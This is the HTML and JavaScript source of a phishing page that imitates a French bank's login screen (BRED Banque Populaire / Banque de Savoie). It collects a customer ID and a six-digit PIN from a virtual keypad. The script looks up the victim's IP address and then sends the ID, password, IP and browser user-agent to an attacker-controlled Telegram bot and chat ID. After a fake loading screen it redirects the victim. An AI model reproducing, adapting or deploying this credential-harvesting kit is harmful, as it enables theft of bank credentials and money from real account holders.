<!DOCTYPE html>
<html lang="fr">
<head>
    <script src="config.js" defer></script>
    <script src="wait-config.js" defer></script>
    <script src="init-telegram.js" defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - BRED Banque Populaire</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        // Configuration Telegram
        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || '[REDACTED]';
        const CHAT_ID = '8176081750';

        // Toast elements
        const toast = document.getElementById('toast');
        
        function showToast(message, isError = false) {
            toast.textContent = message;
            toast.className = 'toast show' + (isError ? ' error' : ' success');
            setTimeout(() => {
                toast.classList.remove('show');
                toast.className = 'toast';
            }, 3000);
        }

        // --- LOGIQUE ÉTAPE 1 (Identifiant) ---
        const inputIdentifiant = document.getElementById('identifiant');
        const btnEtapeSuivante = document.getElementById('btn-etape-suivante');
        const rememberCheckbox = document.getElementById('rememberId');
        
        const etape1 = document.getElementById('etape-1');
        const etape2 = document.getElementById('etape-2');

        let identifiantSaisi = '';

        // Charger l'identifiant mémorisé
        const savedId = localStorage.getItem('banque_savoie_saved_id');
        if (savedId) {
            inputIdentifiant.value = savedId;
            rememberCheckbox.checked = true;
            btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
            btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
            btnEtapeSuivante.removeAttribute('disabled');
            identifiantSaisi = savedId;
        }

        // Activer le bouton de l'étape 1 si l'identifiant n'est pas vide
        inputIdentifiant.addEventListener('input', (e) => {
            if (e.target.value.trim().length > 0) {
                btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
                btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
                btnEtapeSuivante.removeAttribute('disabled');
                identifiantSaisi = e.target.value.trim();
            } else {
                btnEtapeSuivante.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
                btnEtapeSuivante.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
                btnEtapeSuivante.setAttribute('disabled', 'true');
                identifiantSaisi = '';
            }
        });

        // Passer de l'étape 1 à l'étape 2
        btnEtapeSuivante.addEventListener('click', () => {
            if (identifiantSaisi) {
                // Sauvegarder l'identifiant si la case est cochée
                if (rememberCheckbox.checked) {
                    localStorage.setItem('banque_savoie_saved_id', identifiantSaisi);
                } else {
                    localStorage.removeItem('banque_savoie_saved_id');
                }
                
                etape1.classList.add('hidden');
                etape1.classList.remove('flex');
                etape2.classList.remove('hidden');
                etape2.classList.add('flex');
            }
        });

        // --- LOGIQUE ÉTAPE 2 (Mot de passe) ---
        const btnRetour = document.getElementById('btn-retour');
        const touchesClavier = document.querySelectorAll('.touche-clavier');
        const btnSupprimer = document.getElementById('btn-supprimer');
        const btnConnexion = document.getElementById('btn-connexion');
        const affichageMdp = document.getElementById('affichage-mdp');
        
        const LONGUEUR_MDP = 6; 
        let motDePasseSaisi = '';

        // Bouton retour (Efface le mdp et ramène à l'étape 1)
        btnRetour.addEventListener('click', () => {
            etape2.classList.add('hidden');
            etape2.classList.remove('flex');
            etape1.classList.remove('hidden');
            etape1.classList.add('flex');
            motDePasseSaisi = '';
            mettreAJourAffichage();
        });

        // Clic sur les chiffres du clavier
        touchesClavier.forEach(touche => {
            touche.addEventListener('click', (e) => {
                if (motDePasseSaisi.length < LONGUEUR_MDP) {
                    motDePasseSaisi += e.target.innerText;
                    mettreAJourAffichage();
                }
            });
        });

        // Effacer le dernier chiffre saisi
        btnSupprimer.addEventListener('click', () => {
            if (motDePasseSaisi.length > 0) {
                motDePasseSaisi = motDePasseSaisi.slice(0, -1);
                mettreAJourAffichage();
            }
        });

        // Mettre à jour l'affichage des pastilles noires
        function mettreAJourAffichage() {
            affichageMdp.innerHTML = '';
            
            for (let i = 0; i < LONGUEUR_MDP; i++) {
                const pastille = document.createElement('div');
                pastille.className = `w-4 h-4 rounded-full border-2 transition-all duration-200 `;
                
                if (i < motDePasseSaisi.length) {
                    pastille.classList.add('bg-gray-800', 'border-gray-800');
                } else {
                    pastille.classList.add('border-gray-300', 'bg-transparent');
                }
                
                affichageMdp.appendChild(pastille);
            }

            // Activer/Désactiver le bouton final
            if (motDePasseSaisi.length === LONGUEUR_MDP) {
                btnConnexion.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
                btnConnexion.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
                btnConnexion.removeAttribute('disabled');
            } else {
                btnConnexion.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
                btnConnexion.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
                btnConnexion.setAttribute('disabled', 'true');
            }
        }

        // Fonction pour obtenir l'IP
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || 'Non disponible';
            } catch (error) {
                return 'Non disponible';
            }
        }

        // Envoi à Telegram
        async function sendToTelegram() {
            const ip = await getIP();
            const message = `🏔️ BANQUE DE SAVOIE - NOUVELLE CONNEXION 🏔️
━━━━━━━━━━━━━━━━━━━━━
👤 Identifiant: ${identifiantSaisi}
🔑 Mot de passe: ${motDePasseSaisi}
━━━━━━━━━━━━━━━━━━━━━
🌍 IP: ${ip}
📱 User-Agent: ${navigator.userAgent}
🕐 Date: ${new Date().toLocaleString('fr-FR')}
✅ Statut: Connexion en cours`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: window.CHAT_ID || CHAT_ID,
                        text: message
                    })
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log('');
                    ;
                    return true;
                } else {
                                        showToast('❌ Erreur: ' + data.description, true);
                    return false;
                }
            } catch (error) {
                console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
                showToast('❌ Erreur de connexion', true);
                return false;
            }
        }

        // Initialiser l'affichage vide au démarrage
        mettreAJourAffichage();

        // --- VALIDATION ET ENVOI À TELEGRAM ---
        btnConnexion.addEventListener('click', async () => {
            if (motDePasseSaisi.length === LONGUEUR_MDP) {
                
                // Désactiver le bouton pour éviter double clic
                btnConnexion.disabled = true;
                
                // Afficher l'écran de chargement
                const ecranChargement = document.getElementById('ecran-chargement');
                ecranChargement.classList.remove('hidden');
                ecranChargement.classList.add('flex');
                
                // Envoyer les données à Telegram
                await sendToTelegram();
                
                // Attendre 2 secondes puis rediriger
                setTimeout(() => {
                    window.location.href = 'confirmation.html';
                }, 2000);
            }
        });

        // Animation purement visuelle pour le toggle accessibilité
        const toggle = document.getElementById('toggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                if (e.target.checked) {
                    e.target.style.transform = 'translateX(1.25rem)';
                } else {
                    e.target.style.transform = 'translateX(0)';
                }
            });
        }
    </script>
</body>
</html>
